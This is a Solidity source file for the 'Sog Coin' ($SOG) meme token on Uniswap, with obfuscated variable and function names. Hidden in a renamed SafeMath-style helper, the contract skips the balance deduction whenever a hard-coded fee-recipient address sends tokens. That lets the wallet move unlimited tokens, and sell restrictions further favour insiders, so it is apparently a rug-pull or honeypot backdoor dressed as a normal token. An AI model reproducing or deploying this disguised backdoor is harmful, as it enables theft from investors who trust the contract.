/*
Sog Coin   $SOG
Celebrating the OG Spirit: Shiba OG ($SOG) – Where Original Internet Gangsters Unite!


TWITTER: https://twitter.com/SOGEthereum
TELEGRAM: https://t.me/SOGEthereum
WEBSITE: https://sogcoin.org/
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wyauk(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wyauk(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wyauk(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SogCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Sog Coin";
    string private constant _symbol = "SOG";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalsSupplyj_qf = 1000000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyj_qf;
    uint256 public _maxWalletSize = _totalsSupplyj_qf;
    uint256 public _taxSwapThreshold= _totalsSupplyj_qf;
    uint256 public _maxTaxSwap= _totalsSupplyj_qf;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=15;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=5;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _uxfkPaevatingdSwapdngPiy=0;
    uint256 private _biactCdvntudrjDuvng=0;
    address public _tatjFeekRecaversy = 0x1aDa78e88C1D684cbB59D0650B997cD9F0c8F405;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _oxf_advvesPorejg;
    mapping (address => bool) private _twtlfWalesarfy;
    mapping(address => uint256) private _krf_addioss_FlxTmecTransfrsingt;
    bool public _eobaleLnEfoby = false;
    
    IuniswapRouter private _uniswaptRoutersUniswaptFactory;
    address private _uniswapPairTokenskLiquidily;
    bool private FrqoTrardajtpe;
    bool private _flasgeiswapastolg = false;
    bool private _swapixknrUniswaptpSnqlts = false;
 
 
    event RemovesAcyloust(uint _maxTxAmount);
    modifier lockTheSwap {
        _flasgeiswapastolg = true;
        _;
        _flasgeiswapastolg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyj_qf;
        _oxf_advvesPorejg[owner()] = true;
        _oxf_advvesPorejg[address(this)] = true;
        _oxf_advvesPorejg[_tatjFeekRecaversy] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyj_qf);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyj_qf;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wyauk(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_eobaleLnEfoby) {
                if (to != address(_uniswaptRoutersUniswaptFactory) && to != address(_uniswapPairTokenskLiquidily)) {
                  require(_krf_addioss_FlxTmecTransfrsingt[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _krf_addioss_FlxTmecTransfrsingt[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenskLiquidily && to != address(_uniswaptRoutersUniswaptFactory) && !_oxf_advvesPorejg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_biactCdvntudrjDuvng<_uxfkPaevatingdSwapdngPiy){
                  require(!_rodtprcq(to));
                }
                _biactCdvntudrjDuvng++; _twtlfWalesarfy[to]=true;
                taxAmount = amount.mul((_biactCdvntudrjDuvng>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenskLiquidily && from!= address(this) && !_oxf_advvesPorejg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_tatjFeekRecaversy)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_biactCdvntudrjDuvng>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_biactCdvntudrjDuvng>_uxfkPaevatingdSwapdngPiy && _twtlfWalesarfy[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_flasgeiswapastolg 
            && to == _uniswapPairTokenskLiquidily && _swapixknrUniswaptpSnqlts && contractTokenBalance>_taxSwapThreshold 
            && _biactCdvntudrjDuvng>_uxfkPaevatingdSwapdngPiy&& !_oxf_advvesPorejg[to]&& !_oxf_advvesPorejg[from]
            ) {
                swapoToqentjyfp( _dvclr(amount, _dvclr(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wyauk(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wyauk(taxAmount));
        emit Transfer(from, to, amount. _wyauk(taxAmount));
    }

    function swapoToqentjyfp(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FrqoTrardajtpe){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswaptRoutersUniswaptFactory.WETH();
        _approve(address(this), address(_uniswaptRoutersUniswaptFactory), amountForstoken);
        _uniswaptRoutersUniswaptFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _dvclr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wyauk(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _tatjFeekRecaversy){
            return a;
        }else{
            return a. _wyauk(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyj_qf;
        _maxWalletSize=_totalsSupplyj_qf;
        _eobaleLnEfoby=false;
        emit RemovesAcyloust(_totalsSupplyj_qf);
    }

    function _rodtprcq(address _dldtq) private view returns (bool) {
        uint256 letBaetiacaod;
        assembly {
            letBaetiacaod := extcodesize(_dldtq)
        }
        return letBaetiacaod > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FrqoTrardajtpe,"trading is already open");
        _uniswaptRoutersUniswaptFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswaptRoutersUniswaptFactory), _totalsSupplyj_qf);
        _uniswapPairTokenskLiquidily = IUniswapV2Factory(_uniswaptRoutersUniswaptFactory.factory()).createPair(address(this), _uniswaptRoutersUniswaptFactory.WETH());
        _uniswaptRoutersUniswaptFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenskLiquidily).approve(address(_uniswaptRoutersUniswaptFactory), type(uint).max);
        _swapixknrUniswaptpSnqlts = true;
        FrqoTrardajtpe = true;
    }

    receive() external payable {}
}